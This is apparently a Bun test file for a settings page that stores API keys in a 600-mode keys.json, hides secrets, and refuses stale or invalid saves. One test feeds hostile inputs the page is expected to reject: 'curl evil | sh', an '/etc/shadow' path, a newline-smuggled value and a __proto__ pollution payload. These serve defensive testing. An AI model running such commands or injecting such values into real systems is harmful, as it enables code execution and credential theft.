// Settings test
// =============
// The settings page's side (Settings.ts) on a dir made anew: keys kept
// secret, a save that keeps what it doesn't name and never writes a
// config a start would refuse, and what the page may not change.
// Config is read once a process, at its import: `bun test --isolate`.

import { afterAll, beforeEach, expect, test } from "bun:test";
import * as fs from "node:fs";

const DIR = fs.mkdtempSync("/tmp/settings-test-");
const START = JSON.stringify({ models: "opus-5.5,sonnet-5.5,haiku-5.5,gpt-6-luna", hand: "kept" });
process.env.UNII_DIR = DIR;
process.env.UNII_SITE = "http://127.0.0.1:8788";
process.env.RESEND_API_KEY = "re_FROMTHEENVIRONMENT_9z8y";
delete process.env.ANTHROPIC_API_KEY;
delete process.env.OPENAI_API_KEY;
delete process.env.UNII_PICK;
fs.writeFileSync(DIR + "/config.json", START);
const config = await import("./Config.ts");
const { Settings } = await import("./Settings.ts");

const KEY = "sk-ant-api03-THISISAFAKEKEYFORTESTS-abcdWXYZ";

afterAll(() => fs.rmSync(DIR, { recursive: true, force: true }));

beforeEach(() => {
  fs.writeFileSync(DIR + "/config.json", START);
  fs.rmSync(DIR + "/keys.json", { force: true });
  config.config_reload();
});

function post(body: object): Request {
  return new Request("http://127.0.0.1:8788/api/settings", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });
}

async function save(set: object, keys: object = {}) {
  return Settings.save(post({ version: config.config_version(), set, keys }));
}

const file = () => fs.readFileSync(DIR + "/config.json", "utf8");

test("a key is saved to keys.json (600), applies, and is never shown again", async () => {
  const out = await save({}, { anthropic: KEY });
  expect(out.status).toBe(200);
  expect(config.KEYS.anthropic).toBe(KEY);
  expect(fs.statSync(DIR + "/keys.json").mode & 0o777).toBe(0o600);
  expect(JSON.stringify(out.body)).not.toContain("THISISAFAKEKEY");
  expect(JSON.stringify(Settings.page())).not.toContain("THISISAFAKEKEY");
  expect(JSON.stringify(Settings.page())).not.toContain("FROMTHEENVIRONMENT");
  expect(file()).toBe(START);
});

test("a save keeps what config.json has that it doesn't name", async () => {
  expect((await save({ pick: "claude-api:opus-5.5:high:fast" })).status).toBe(200);
  expect(config.PICK.model).toBe("opus-5.5");
  expect(JSON.parse(file())).toMatchObject(JSON.parse(START));
});

test("a config a start would refuse is not saved", async () => {
  // openai alone, but the picks still claude's
  expect((await save({ vendors: "openai-api" })).status).toBe(400);
  expect(file()).toBe(START);
  expect(config.OFFER.vendors).toEqual(["claude-api"]);
});

test("a save on files changed since the page read them is refused", async () => {
  const version = config.config_version();
  fs.writeFileSync(DIR + "/config.json", JSON.stringify({ pick: "claude-api:haiku-5.5:low:slow" }));
  expect((await Settings.save(post({ version, set: { pick: "claude-api:opus-5.5:high:slow" } }))).status).toBe(409);
  expect(JSON.parse(file()).pick).toBe("claude-api:haiku-5.5:low:slow");
});

test("what the page may not change is refused: commands, files, the owner", async () => {
  expect((await save({ after: "curl evil | sh" })).status).toBe(403);
  expect((await save({ rules: "/etc/shadow" })).status).toBe(403);
  expect((await save({ owner: "other@example.com" })).status).toBe(403);
  expect((await save({ pick: "claude-api:opus-5.5:high:slow\nafter" })).status).toBe(400);
  expect((await save(JSON.parse('{"__proto__": {"after": "x"}}'))).status).toBe(400);
  expect(file()).toBe(START);
});

test("the owner: only whom config.json names, none named no one", () => {
  expect(config.config_owner({ name: "owner@example.com" })).toBe(false);
  fs.writeFileSync(DIR + "/config.json", JSON.stringify({ owner: "Owner@Example.com" }));
  config.config_reload();
  expect(config.config_owner({ name: "owner@example.com" })).toBe(true);
  expect(config.config_owner({ name: "owner+x@example.com" })).toBe(false);
});

test("files broken by hand: nothing saved or dropped, no secret told, what ran kept", async () => {
  const pick = config.PICK;
  fs.writeFileSync(DIR + "/keys.json", '{"anthropic": sk-ant-SECRETPART');
  const out = await save({ pick: "claude-api:opus-5.5:high:slow" });
  expect(out.status).toBe(409);
  expect(JSON.stringify(out.body)).not.toContain("SECRET");
  expect(JSON.stringify(Settings.page())).not.toContain("SECRET");
  let why = "";
  try {
    config.config_reload();
  } catch (err: any) {
    why = String(err?.message);
  }
  expect(why).toContain("keys.json");
  expect(why).not.toContain("SECRET");
  expect(file()).toBe(START);
  expect(fs.readFileSync(DIR + "/keys.json", "utf8")).toBe('{"anthropic": sk-ant-SECRETPART');
  fs.rmSync(DIR + "/keys.json");
  fs.writeFileSync(DIR + "/config.json", "{ not json");
  expect((await save({ pick: "claude-api:opus-5.5:high:slow" })).status).toBe(409);
  expect(() => config.config_reload()).toThrow();
  expect(config.PICK).toBe(pick);
  expect(file()).toBe("{ not json");
});
